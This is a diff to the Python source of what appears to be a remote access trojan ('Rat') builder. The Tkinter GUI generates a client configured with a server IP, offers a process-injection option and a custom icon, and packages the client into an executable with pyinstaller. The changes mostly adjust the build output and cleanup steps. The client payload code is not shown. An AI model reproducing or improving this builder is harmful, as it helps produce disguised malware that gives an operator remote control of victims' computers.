@@ -828,7 +828,7 @@ class Rat:
         self.log_area.config(state=tk.DISABLED)
         self.log_area.see(tk.END)
     
-    def generate_client(self, config, output_path):
+    def generate_client(self, config):
         import shutil
         import tempfile
         server_ip = config['SERVER_IP']
@@ -1628,7 +1628,6 @@ if __name__ == "__main__":
             client_path = os.path.join(temp_dir, "client.py")
             with open(client_path, "w") as client_file:
                 client_file.write(client_code)
-
                 while True:
                     if shutil.which("pyinstaller"):
                         command = [
@@ -1641,18 +1640,12 @@ if __name__ == "__main__":
                             client_path
                         ]
                         os.system(" ".join(command))
-                        exe_path = os.path.join(temp_dir, "dist", outputname)
-                        if os.path.exists(exe_path):
-                            shutil.move(exe_path, output_path)
-                        else:
-                            pass
-                        os.remove('build')
-                        os.remove('builds')
-                        os.remove(f'{outputname}.spec')
                         break
                     else:
                         if shutil.which('python'):
                             os.system('pip install pyinstaller')
+                            time.sleep(3)
+                            os.system('pip install pillow')
                             time.sleep(3)
                             continue
                         else:
@@ -1794,7 +1787,6 @@ if __name__ == "__main__":
             activeforeground=self.colors["terminal_green"]
         ).pack(pady=5, side='left')
 
-        # Process Injection option
         process_injection_var = tk.BooleanVar(value=False)
         tk.Checkbutton(
             options_frame,
@@ -1807,7 +1799,6 @@ if __name__ == "__main__":
             activeforeground=self.colors["terminal_green"]
         ).pack(pady=5, side='left')
 
-        # Build options frame
         build_frame = tk.Frame(
             main_frame,
             bg=self.colors["bg_dark"],
@@ -1824,10 +1815,9 @@ if __name__ == "__main__":
             bg=self.colors["bg_dark"]
         ).pack(pady=10)
 
-        # Icon selection
         def select_icon():
             icon_path = filedialog.askopenfilename(
-                filetypes=[("Icon files", "*.ico")]
+                filetypes=[("PNG files", "*.png")]
             )
             if icon_path:
                 icon_label.config(text=f"Selected: {os.path.basename(icon_path)}")
@@ -1893,18 +1883,12 @@ if __name__ == "__main__":
                         self.log("Error: Process name is required for injection.")
                         return
 
-                output_dir = "builds"
-                if not os.path.exists(output_dir):
-                    os.makedirs(output_dir)
-
-                output_path = os.path.join(output_dir, config["OUTPUT_NAME"])
-
-                self.generate_client(config, output_path)
-
-                self.log(f"Client built successfully: {output_path}")
-                showinfo("Success", f"Client has been built and saved to:\ndist")
+                self.generate_client(config)
+                shutil.rmtree('build')
+                os.remove(f'{config["OUTPUT_NAME"]}.spec')
+                self.log(f"Client built successfully")
+                showinfo("Success", f"Client has been built and saved to dist")
                 builder_window.destroy()
-
             except Exception as e:
                 self.log(f"Build error: {e}")
                 showerror("Error", f"Failed to build client:\n{str(e)}")
